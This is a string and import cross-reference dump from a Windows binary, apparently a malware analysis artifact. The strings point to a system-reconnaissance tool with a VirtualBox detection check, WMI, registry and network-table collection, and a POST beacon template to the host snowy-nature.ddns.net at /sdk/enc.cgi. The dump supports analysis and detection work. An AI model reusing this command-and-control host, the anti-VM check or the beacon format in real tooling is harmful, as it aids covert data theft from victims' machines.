reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x4021bc	0x409600	string	0x401d81	SELECT * FROM Win32_PnPEntity WHERE DeviceID='PCI\\VEN_80EE^&DEV_CAFE'
0x4021cc	0x409456	string	0x401d81	ROOT\CIMV2
0x402202	0x409690	string	0x401d81	<mother board>\n
0x402227	0x4096a0	string	0x401d81	SELECT * FROM Win32_BaseBoard
0x402237	0x409456	string	0x401d81	ROOT\CIMV2
0x40226d	0x4096dc	string	0x401d81	<bios>\n
0x402292	0x4096e4	string	0x401d81	SELECT * FROM Win32_BIOS
0x4022a2	0x409456	string	0x401d81	ROOT\CIMV2
0x4022d8	0x409716	string	0x401d81	<os>\n
0x4022fd	0x40971c	string	0x401d81	SELECT * FROM Win32_OperatingSystem
0x40230d	0x409456	string	0x401d81	ROOT\CIMV2
0x402343	0x409764	string	0x401d81	<login history>\n
0x402368	0x409778	string	0x401d81	SELECT * FROM Win32_NTLogEvent WHERE logfile='system' And EventCode='6005'
0x402378	0x409456	string	0x401d81	ROOT\CIMV2
0x40243f	0x4091ab	string	0x401d81	.\Scorpius.txt
0x4024a8	0x40980e	string	0x40247d	.\Circinus.txt
0x40256a	0x409820	string	0x40247d	<IP, MAC, Default Gateway, DNS>\n
0x402598	0x409841	string	0x40247d	\n<Port List>\n
0x4025d1	0x40984f	string	0x40247d	\n<ARP List>\n
0x402690	0x40980e	string	0x40247d	.\Circinus.txt
0x4026f9	0x40985c	string	0x4026ce	.\Aquarius.txt
0x4027bb	0x40986e	string	0x4026ce	<Application list>\n
0x4027c7	0x409882	string	0x4026ce	.exe
0x4027e6	0x409887	string	0x4026ce	C:\Program Files
0x4028ad	0x40985c	string	0x4026ce	.\Aquarius.txt
0x402916	0x409898	string	0x4028eb	.\Orion.txt
0x4029d8	0x4098a7	string	0x4028eb	\n<OS product ID>\n
0x402a19	0x4098b9	string	0x4028eb	<System manufacturer>\n
0x402a5a	0x4098d0	string	0x4028eb	<OS Version>\n
0x402a9b	0x4098de	string	0x4028eb	<# Processors>\n
0x402adc	0x4098ee	string	0x4028eb	<Memory>\n
0x402b1d	0x4098f8	string	0x4028eb	<Disk>\n
0x402b5e	0x409900	string	0x4028eb	<# Icons of Desktop>\n
0x402b9f	0x409916	string	0x4028eb	<System locale>\n
0x402be0	0x409927	string	0x4028eb	<Resolution>\n
0x402cb2	0x409898	string	0x4028eb	.\Orion.txt
0x402d5f	0x409935	string	0x402cfa	WSAStartup Failed.
0x402d7a	0x409038	string	0x402cfa	snowy-nature.ddns.net
0x402d8b	0x409038	string	0x402cfa	snowy-nature.ddns.net
0x402da5	0x409948	string	0x402cfa	NXdomain
0x402ec4	0x409024	string	0x402cfa	516516
0x402ecc	0x40902b	string	0x402cfa	/sdk/enc.cgi
0x402ed4	0x409038	string	0x402cfa	snowy-nature.ddns.net
0x402edc	0x409038	string	0x402cfa	snowy-nature.ddns.net
0x402ee4	0x40902b	string	0x402cfa	/sdk/enc.cgi
0x402eec	0x409050	string	0x402cfa	POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)\r\nReferer: http://%s%s\r\nCokkie: xtl_s=%s\r\nContent-Length: 207\r\n\r\n
0x402f84	0x409952	string	0x402cfa	Basic realm=
0x403007	0x409024	string	0x402cfa	516516
0x40300f	0x40902b	string	0x402cfa	/sdk/enc.cgi
0x403017	0x409038	string	0x402cfa	snowy-nature.ddns.net
0x40301f	0x409038	string	0x402cfa	snowy-nature.ddns.net
0x403027	0x40902b	string	0x402cfa	/sdk/enc.cgi
0x40302f	0x409964	string	0x402cfa	POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)\r\nReferer: http://%s%s\r\nCokkie: xtl_s=%s\r\nContent-Length: 207\r\n
0x4031e4	0x4099fa	string	0x402cfa	tws_action=%s&
0x403242	0x409a09	string	0x402cfa	RegisteredOwner
0x40324a	0x409a1c	string	0x402cfa	SOFTWARE\Microsoft\Windows NT\CurrentVersion
0x403366	0x409a49	string	0x402cfa	RegisteredOrganization
0x40336e	0x409a1c	string	0x402cfa	SOFTWARE\Microsoft\Windows NT\CurrentVersion
0x4034a8	0x409a60	string	0x402cfa	InstallDate
0x4034b0	0x409a1c	string	0x402cfa	SOFTWARE\Microsoft\Windows NT\CurrentVersion
0x403613	0x409a6c	string	0x402cfa	BIOSVendor
0x40361b	0x409a78	string	0x402cfa	HARDWARE\DESCRIPTION\System\BIOS
0x4036a1	0x409a99	string	0x402cfa	BIOSVersion
0x4036a9	0x409a78	string	0x402cfa	HARDWARE\DESCRIPTION\System\BIOS
0x40372f	0x409aa5	string	0x402cfa	BIOSReleaseDate
0x403737	0x409a78	string	0x402cfa	HARDWARE\DESCRIPTION\System\BIOS
0x403b18	0x409024	string	0x402cfa	516516
0x403b20	0x40902b	string	0x402cfa	/sdk/enc.cgi
0x403b28	0x409038	string	0x402cfa	snowy-nature.ddns.net
0x403b30	0x409038	string	0x402cfa	snowy-nature.ddns.net
0x403b38	0x40902b	string	0x402cfa	/sdk/enc.cgi
0x403b40	0x409050	string	0x402cfa	POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)\r\nReferer: http://%s%s\r\nCokkie: xtl_s=%s\r\nContent-Length: 207\r\n\r\n
0x403c5c	0x409ab5	string	0x402cfa	HTTP/1.1 200 OK\r\n
0x403cd3	0x409adc	string	0x403c8c	Error allocating memory needed to call GetAdaptersinfo\n
0x403d39	0x409adc	string	0x403c8c	Error allocating memory needed to call GetAdaptersinfo\n
0x403d86	0x409b14	string	0x403c8c	ComboIndex: \t%d\n
0x403da3	0x409b25	string	0x403c8c	Adapter Name: \t%s\n
0x403dc2	0x409b38	string	0x403c8c	Adapter Desc: \t%s\n
0x403dec	0x409b4b	string	0x403c8c	Adapter Addr: \t
0x403e2a	0x409b5b	string	0x403c8c	%.2X\n
0x403e57	0x409b61	string	0x403c8c	%.2X-
0x403e89	0x409b67	string	0x403c8c	Index: \t%d\n
0x403eb3	0x409b73	string	0x403c8c	Type: \t
0x403ef1	0x409b7b	string	0x403c8c	Other\n
0x403f19	0x409b82	string	0x403c8c	Ethernet\n
0x403f41	0x409b8c	string	0x403c8c	Token Ring\n
0x403f69	0x409b98	string	0x403c8c	FDDI\n
0x403f91	0x409b9e	string	0x403c8c	PPP\n
0x403fb6	0x409ba3	string	0x403c8c	Lookback\n
0x403fdb	0x409bad	string	0x403c8c	Slip\n
0x403ff6	0x409bb3	string	0x403c8c	Unknown type %ld\n
0x404016	0x409bc5	string	0x403c8c	IP Address: \t%s\n
0x404035	0x409bd6	string	0x403c8c	IP Mask: \t%s\n
0x404054	0x409be4	string	0x403c8c	Gateway: \t%s\n
0x40407e	0x409bf2	string	0x403c8c	***\n
0x4040ae	0x409bf7	string	0x403c8c	DHCP Enabled: Yes\n
0x4040c6	0x409c0a	string	0x403c8c	DHCP Server: \t%s\n
0x4040f0	0x409c1e	string	0x403c8c	Lease Obtained:
0x404115	0x409c31	string	0x403c8c	DHCP Enabled: No\n
0x404145	0x409c43	string	0x403c8c	Have Wins: Yes\n
0x40415d	0x409c53	string	0x403c8c	Primary Wins Server: %s\n
0x40417c	0x409c71	string	0x403c8c	Secondary Wins Server: %s\n
0x4041a8	0x409c8f	string	0x403c8c	Have Wins: No\n
0x4041e2	0x409ca0	string	0x403c8c	GetAdaptersInfo failed with error: %d\n
0x404326	0x409d40	string	0x40420d	%02x-
0x404392	0x409d46	string	0x40420d	%02x
0x4043db	0x409d4b	string	0x40420d	other
0x4043e4	0x409d51	string	0x40420d	\t%s\n
0x4043f9	0x409d56	string	0x40420d	invalid
0x404402	0x409d51	string	0x40420d	\t%s\n
0x404417	0x409d5e	string	0x40420d	dynamic
0x404420	0x409d51	string	0x40420d	\t%s\n
0x404435	0x409d66	string	0x40420d	static
0x40443e	0x409d51	string	0x40420d	\t%s\n
0x404480	0x409d6d	string	0x40420d	GetIpNetTable failed.\n
0x4044d6	0x409d84	string	0x40420d	\tError: %s
0x40455a	0x409d8f	string	0x4044fe	Error allocating memory\n
0x404603	0x409d8f	string	0x4044fe	Error allocating memory\n
0x40464c	0x409da8	string	0x4044fe	Number of entries: %d\n
0x40472e	0x409dbf	string	0x4044fe	TCP[%d] %s:%d
0x404779	0x409dcd	string	0x4044fe	%s:%d
0x4047cc	0x409dd5	string	0x4044fe	CLOSED\n
0x4047f4	0x409ddd	string	0x4044fe	LISTEN\n
0x40481c	0x409de5	string	0x4044fe	SYN-SENT\n
0x404844	0x409def	string	0x4044fe	SYN-RECEIVED\n
0x40486c	0x409dfd	string	0x4044fe	ESTABLISHED\n
0x404894	0x409e0a	string	0x4044fe	FIN-WAIT-1\n
0x4048bc	0x409e16	string	0x4044fe	FIN-WAIT-2 \n
0x4048e4	0x409e23	string	0x4044fe	CLOSE-WAIT\n
0x40490c	0x409e2f	string	0x4044fe	CLOSING\n
0x404934	0x409e38	string	0x4044fe	LAST-ACK\n
0x404959	0x409e42	string	0x4044fe	TIME-WAIT\n
0x40497e	0x409e4d	string	0x4044fe	DELETE-TCB\n
0x4049a3	0x409e59	string	0x4044fe	UNKNOWN dwState value\n
0x4049cb	0x409e70	string	0x4044fe	\tGetTcpTable failed with %d\n
0x404a9e	0x409d8f	string	0x404a42	Error allocating memory\n
0x404b47	0x409d8f	string	0x404a42	Error allocating memory\n
0x404b90	0x409da8	string	0x404a42	Number of entries: %d\n
0x404c13	0x409ec4	string	0x404a42	UDP[%d] %s:%d\n
0x404c41	0x409ed4	string	0x404a42	GetUdpTable failed with %d\n
0x404cc5	0x409f02	string	0x404cb8	kernel32
0x404cd6	0x409f0b	string	0x404cb8	IsWow64Process
0x404f7d	0x409f1a	string	0x404d1d	%d/%d/%d %d:%d:%d%s
0x404fde	0x4073d0	string	0x404fc8	UWVS
0x405078	0x409f30	string	0x404fc8	%04d/%02d/%02d %02d:%02d:%02d %12d %s\n
0x405094	0x409f57	string	0x404fc8	\t\t%s\n
0x4050db	0x409f5d	string	0x4050af	%s: not found\n
0x4051d3	0x409f71	string	0x4050af	Directry of %s\n
0x405222	0x409f71	string	0x4050af	Directry of %s\n
0x405397	0x409f84	string	0x4052b4	pointer %d : (dx, dy)=(%d, %d)\n
0x405400	0x409fa4	string	0x4053e8	Runtime: %d msec.\n
0x40546f	0x409fb8	string	0x405442	Total Physical Memory (byte) : %ld \n
0x405489	0x409fe4	string	0x405442	Available Physical Memory (byte) : %ld \n
0x4054a3	0x40a010	string	0x405442	Total Virtual Memory (byte) : %ld \n
0x4054bd	0x40a03c	string	0x405442	Available Virtual Memory (byte) : %ld \n
0x4054de	0x409fb8	string	0x405442	Total Physical Memory (byte) : %ld \n
0x4054ff	0x409fe4	string	0x405442	Available Physical Memory (byte) : %ld \n
0x405520	0x40a010	string	0x405442	Total Virtual Memory (byte) : %ld \n
0x405541	0x40a03c	string	0x405442	Available Virtual Memory (byte) : %ld \n
0x405571	0x40a066	string	0x405556	ProductId
0x405579	0x40a070	string	0x405556	SOFTWARE\Microsoft\Windows NT\CurrentVersion
0x4055c7	0x40a0a1	string	0x4055ac	SystemManufacturer
0x4055cf	0x40a0b4	string	0x4055ac	SYSTEM\CurrentControlSet\Control\SystemInformation
0x40563c	0x40a0e7	string	0x405602	OS version: %d.%d\n
0x40566e	0x40a0fa	string	0x405651	#Processor: %d\n
0x4056dd	0x40a10a	string	0x405683	%c:\
0x405721	0x40a10f	string	0x405683	Drive[%d]: %s\n
0x405790	0x40a11e	string	0x405683	Volume name : %s\n
0x4057ad	0x40a130	string	0x405683	Serial number : %08X\n
0x4057ca	0x40a146	string	0x405683	File system name : %s\n
0x405823	0x40a15d	string	0x405683	Available : %I64u Byte\n
0x40584a	0x40a175	string	0x405683	All : %I64u Byte\n
0x405871	0x40a18d	string	0x405683	Free : %I64u Byte\n
0x4058df	0x40a1a8	string	0x405898	System locale : %s\nLocale ID : %d\n
0x405902	0x40a1cb	string	0x4058f4	ProgMan
0x40597e	0x40a1d3	string	0x4058f4	# icon(s) of Desktop : %d\n
0x405a15	0x40a1ee	string	0x405993	Resolution : %d X %d\n
0x405a2f	0x40a204	string	0x405993	Color : %d Bits\n
0x405ad0	0x40a218	string	0x405a44	error\n
0x405b57	0x40a21f	string	0x405a44	error
0x405bc4	0x40a21f	string	0x405a44	error
0x405c65	0x40a21f	string	0x405a44	error
0x405d10	0x40a21f	string	0x405a44	error
0x405e84	0x40a225	string	0x405a44	%ls: %s\n
0x405eac	0x40a22e	string	0x405a44	%ls: %d\n
0x405ed1	0x40a237	string	0x405a44	%ls: %u\n
0x405ef6	0x40a240	string	0x405a44	%ls: %ls\n
0x405f1b	0x40a22e	string	0x405a44	%ls: %d\n
0x4061c3	0x40a28d	string	0x4060f3	%%%2X
0x406264	0x40c33c	import	0x406264	IPHLPAPI.DLL.GetAdaptersInfo
0x40626c	0x40c340	import	0x40626c	IPHLPAPI.DLL.GetIpNetTable
0x406274	0x40c344	import	0x406274	IPHLPAPI.DLL.GetTcpTable
0x40627c	0x40c348	import	0x40627c	IPHLPAPI.DLL.GetUdpTable
0x406447	0x40c45c	import	0x4063a0	msvcrt.dll._onexit
0x40664c	0x40a478	string	0x406630	Unknown error
0x406679	0x40a488	string	0x406630	_matherr(): %s in %s(%g, %g) (retval=%g)\n
0x4066bd	0x40a5ac	string	0x4066a0	Mingw-w64 runtime failure:\n
0x40678f	0x40c400	import	0x406700	KERNEL32.dll.VirtualQuery
0x406813	0x40c400	import	0x406700	KERNEL32.dll.VirtualQuery
0x40682b	0x40c3fc	import	0x406700	KERNEL32.dll.VirtualProtect
0x406a2e	0x40a678	string	0x406950	Unknown pseudo relocation bit size %d.\n
0x406d08	0x40c3ac	import	0x406cd0	KERNEL32.dll.GetSystemTimeAsFileTime
0x406d19	0x40c374	import	0x406cd0	KERNEL32.dll.GetCurrentProcessId
0x406d21	0x40c378	import	0x406cd0	KERNEL32.dll.GetCurrentThreadId
0x406d2a	0x40c3b0	import	0x406cd0	KERNEL32.dll.GetTickCount
0x406d39	0x40c3d8	import	0x406cd0	KERNEL32.dll.QueryPerformanceCounter
0x406dcf	0x40c3e4	import	0x406d80	KERNEL32.dll.SetUnhandledExceptionFilter
0x406ddf	0x40c3f4	import	0x406d80	KERNEL32.dll.UnhandledExceptionFilter
0x406de8	0x40c370	import	0x406d80	KERNEL32.dll.GetCurrentProcess
0x406df9	0x40c3ec	import	0x406d80	KERNEL32.dll.TerminateProcess
0x406e20	0x40c364	import	0x406e10	KERNEL32.dll.EnterCriticalSection
0x406e2c	0x40c388	import	0x406e10	KERNEL32.dll.GetLastError
0x406e45	0x40c3f0	import	0x406e10	KERNEL32.dll.TlsGetValue
0x406e70	0x40c3d0	import	0x406e10	KERNEL32.dll.LeaveCriticalSection
0x406edc	0x40c364	import	0x406e90	KERNEL32.dll.EnterCriticalSection
0x406efa	0x40c3d0	import	0x406e90	KERNEL32.dll.LeaveCriticalSection
0x406f47	0x40c364	import	0x406f20	KERNEL32.dll.EnterCriticalSection
0x406f78	0x40c3d0	import	0x406f20	KERNEL32.dll.LeaveCriticalSection
0x407009	0x40c35c	import	0x406fc0	KERNEL32.dll.DeleteCriticalSection
0x4070cc	0x4070da	string	0x4070a0	[^Ív blocks=Basic Latin,Latin-1 Supplement
0x4075fe	0x40c384	import	0x4075d0	KERNEL32.dll.GetFileAttributesA
0x407845	0x40c388	import	0x407790	KERNEL32.dll.GetLastError
0x407a30	0x40c424	import	0x407a30	msvcrt.dll.__set_app_type
0x407a38	0x40c418	import	0x407a38	msvcrt.dll.__getmainargs
0x407a60	0x40c4a8	import	0x407a60	msvcrt.dll.malloc
0x407a68	0x40c4cc	import	0x407a68	msvcrt.dll.strlen
0x407a70	0x40c4ac	import	0x407a70	msvcrt.dll.memcpy
0x407a78	0x40c434	import	0x407a78	msvcrt.dll._cexit
0x407a80	0x40c430	import	0x407a80	msvcrt.dll._amsg_exit
0x407a88	0x40c450	import	0x407a88	msvcrt.dll._initterm
0x407a90	0x40c474	import	0x407a90	msvcrt.dll.exit
0x407a98	0x40c480	import	0x407a98	msvcrt.dll.fgets
0x407aa0	0x40c4bc	import	0x407aa0	msvcrt.dll.sprintf
0x407aa8	0x40c484	import	0x407aa8	msvcrt.dll.fopen
0x407ab0	0x40c498	import	0x407ab0	msvcrt.dll.fseek
0x407ab8	0x40c49c	import	0x407ab8	msvcrt.dll.ftell
0x407ac0	0x40c47c	import	0x407ac0	msvcrt.dll.fgetc
0x407ac8	0x40c4c0	import	0x407ac8	msvcrt.dll.strcat
0x407ad0	0x40c4b0	import	0x407ad0	msvcrt.dll.memset
0x407ad8	0x40c494	import	0x407ad8	msvcrt.dll.free
0x407ae0	0x40c478	import	0x407ae0	msvcrt.dll.fclose
0x407ae8	0x40c4a0	import	0x407ae8	msvcrt.dll.fwrite
0x407af0	0x40c4c8	import	0x407af0	msvcrt.dll.strcpy
0x407af8	0x40c488	import	0x407af8	msvcrt.dll.fprintf
0x407b00	0x40c490	import	0x407b00	msvcrt.dll.fputs
0x407b08	0x40c48c	import	0x407b08	msvcrt.dll.fputc
0x407b10	0x40c4b4	import	0x407b10	msvcrt.dll.puts
0x407b18	0x40c4d4	import	0x407b18	msvcrt.dll.strstr
0x407b20	0x40c468	import	0x407b20	msvcrt.dll.atoi
0x407b28	0x40c4c4	import	0x407b28	msvcrt.dll.strcmp
0x407b30	0x40c4a4	import	0x407b30	msvcrt.dll.localtime
0x407b38	0x40c458	import	0x407b38	msvcrt.dll._lock
0x407b40	0x40c414	import	0x407b40	msvcrt.dll.__dllonexit
0x407b48	0x40c464	import	0x407b48	msvcrt.dll._unlock
0x407b50	0x40c4b8	import	0x407b50	msvcrt.dll.signal
0x407b58	0x40c428	import	0x407b50	msvcrt.dll.__setusermatherr
0x407b60	0x40c4d8	import	0x407b60	msvcrt.dll.vfprintf
0x407b68	0x40c46c	import	0x407b68	msvcrt.dll.abort
0x407b70	0x40c470	import	0x407b70	msvcrt.dll.calloc
0x407b78	0x40c4d0	import	0x407b78	msvcrt.dll.strncmp
0x407b80	0x40c460	import	0x407b80	msvcrt.dll._stat
0x407b88	0x40c43c	import	0x407b88	msvcrt.dll._errno
0x407b90	0x40c44c	import	0x407b90	msvcrt.dll._fullpath
0x407b98	0x40c438	import	0x407b98	msvcrt.dll._findnext
0x407ba0	0x40c444	import	0x407ba0	msvcrt.dll._findfirst
0x407ba8	0x40c440	import	0x407ba8	msvcrt.dll._findclose
0x407bb0	0x40c3f8	import	0x407bb0	KERNEL32.dll.VerLanguageNameA
